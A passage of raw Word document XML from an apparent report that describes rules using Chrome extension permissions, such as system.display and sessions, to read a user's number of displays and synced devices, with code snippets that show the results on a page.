                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>displays.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>length</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0EB81097" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652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2"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="134246ED" w14:textId="65248806" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 9: User’s number of displays.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="200"/>
    </w:p>
    <w:p w14:paraId="3DC5A7AF" w14:textId="1663FA8D" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="201" w:name="_Ref514844108"/>
      <w:bookmarkStart w:id="202" w:name="_Toc523071587"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:t>: User’s number of displays.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="201"/>
      <w:bookmarkEnd w:id="202"/>
    </w:p>
    <w:p w14:paraId="49B454A1" w14:textId="2AFBB18A" w:rsidR="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="007652E7">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">This rule uses the </w:t>
      </w:r>
      <w:r w:rsidRPr="006A4E27">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="203" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:44:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>system.display</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> permission to find out how many displays the user has.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D6B462" w14:textId="77777777" w:rsidR="007652E7" w:rsidRPr="00F66EC0" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="204" w:name="_Toc523071523"/>
    <w:p w14:paraId="261F73D7" w14:textId="7DC32E4B" w:rsidR="001175B2" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251696128" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="751B36CD" wp14:editId="21AC6059">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>left</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>563880</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5924550" cy="3076575"/>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076575"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5BC504D9" w14:textId="4FDCFF96" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652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CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>/**</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> * (sessions)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> * Find information about a user's sessions.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> */</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>chrome.sessions.getDevices(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(devices){</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="808080"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>// set html</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="808080"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>document.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>getElementById</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>'num-devices'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>).innerHTML = devices.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>length</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">device_names = </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>" "</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>devices.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>forEach</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(device) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">      device_names = device_names + device.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">info </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">+ </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>" "</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>})</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>document.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>getElementById</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>'devices'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>).innerHTML = device_names</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6C45EE90" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652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2"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="6036F68B" w14:textId="48180001" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D">
                            <w:pPr>
                              <w:rPr>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1B36CD" id="_x0000_s1039" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:44.4pt;width:466.5pt;height:242.25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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5BC504D9" w14:textId="4FDCFF96" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652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CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>/**</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> * (sessions)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> * Find information about a user's sessions.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> */</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>chrome.sessions.getDevices</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
